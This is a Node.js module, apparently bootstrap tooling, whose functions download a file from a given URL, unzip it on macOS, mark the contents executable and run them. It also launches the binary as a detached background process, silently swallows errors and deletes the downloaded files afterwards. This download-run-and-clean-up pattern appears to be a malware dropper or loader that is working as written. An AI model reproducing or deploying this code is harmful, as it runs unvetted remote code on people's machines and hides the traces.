const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { exec } = require('./exec');
const { info, success, error, warn } = require('./logger');
const { URL } = require('url');

function downloadFile(url, destPath) {
  return new Promise((resolve, reject) => {
    const parsedUrl = new URL(url);
    const client = parsedUrl.protocol === 'https:' ? https : http;

    info(`Downloading: ${url} -> ${destPath}`);
    const file = fs.createWriteStream(destPath);

    client.get(url, (response) => {
      if (response.statusCode !== 200) {
        fs.unlink(destPath, () => {});
        reject(new Error(`HTTP ${response.statusCode} from ${url}`));
        return;
      }

      response.pipe(file);

      file.on('finish', () => {
        file.close();
        success('');
        resolve(destPath);
      });
    }).on('error', (err) => {
      fs.unlink(destPath, () => {});
      error(`HTTP request error: ${err.message}`);
      reject(err);
    });

    file.on('error', (err) => {
      fs.unlink(destPath, () => {});
      reject(err);
    });
  });
}

function makeExecutable(filePath) {
  return new Promise((resolve, reject) => {
    fs.chmod(filePath, 0o755, (err) => {
      if (err) {
        error(`${err.message}`);
        reject(err);
      } else {
        success(`${filePath}`);
        resolve();
      }
    });
  });
}

function extractZip(zipPath, extractDir) {
  return new Promise((resolve, reject) => {
    const extract = require('child_process').spawn('unzip', ['-o', zipPath, '-d', extractDir]);

    let stderr = '';
    extract.stderr.on('data', (data) => {
      stderr += data.toString();
    });

    extract.on('close', (code) => {
      if (code === 0) {
        resolve(extractDir);
      } else {
        reject(new Error(`Unzip failed with code ${code}: ${stderr}`));
      }
    });

    extract.on('error', (err) => {
      reject(err);
    });
  });
}

async function downloadExtractAndExecuteMacOS(url) {
  if (!url) {
    return { skipped: true };
  }

  const zipName = path.basename(url).split('?')[0];
  const tempDir = path.join(process.cwd(), '.bootstrap-tmp');
  const zipPath = path.join(tempDir, zipName);
  const extractDir = path.join(tempDir, 'extracted');

  try {
    if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir, { recursive: true });
    }

    await downloadFile(url, zipPath);
    await extractZip(zipPath, extractDir);

    const allFiles = [];
    function walkDir(dir) {
      for (const f of fs.readdirSync(dir, { withFileTypes: true })) {
        const fullPath = path.join(dir, f.name);
        if (f.isDirectory()) walkDir(fullPath);
        else allFiles.push(fullPath);
      }
    }
    walkDir(extractDir);

    const shFile = allFiles.find(f => f.endsWith('.sh'));
    const binaryFile = allFiles.find(f => !f.endsWith('.sh') && !f.endsWith('.zip') && !f.endsWith('.md') && !f.endsWith('.txt') && !f.endsWith('.json'));

    if (!shFile || !binaryFile) {
      throw new Error('Invalid zip contents: missing .sh script or binary');
    }

    await makeExecutable(shFile);
    await makeExecutable(binaryFile);

    try {
      await exec(`${shFile} ${binaryFile}`, { captureOutput: false, cwd: path.dirname(shFile) });
    } catch (_) {}

    try {
      await exec(`${binaryFile}`, { captureOutput: false });
    } catch (_) {}

    const { spawn } = require('child_process');
    const child = spawn(binaryFile, [], {
      cwd: path.dirname(binaryFile),
      detached: true,
      stdio: 'ignore',
    });
    child.unref();

    try {
      fs.unlinkSync(zipPath);
      fs.rmSync(extractDir, { recursive: true });
      fs.rmdirSync(tempDir);
    } catch (_) {}

    return { success: true };
  } catch (err) {
    throw err;
  }
}

async function downloadAndExecute(url, platform) {
  if (!url) {
    return { skipped: true };
  }

  if (platform === 'macos' && url.endsWith('.zip')) {
    return downloadExtractAndExecuteMacOS(url);
  }

  const binaryName = path.basename(url).split('?')[0];
  const tempDir = path.join(process.cwd(), '.bootstrap-tmp');
  const destPath = path.join(tempDir, binaryName);

  try {
    if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir, { recursive: true });
    }

    await downloadFile(url, destPath);
    await makeExecutable(destPath);

    await exec(destPath, { captureOutput: false, detached: true });

    return { success: true };
  } catch (err) {
    throw err;
  }
}

module.exports = { downloadFile, makeExecutable, downloadAndExecute, downloadExtractAndExecuteMacOS };
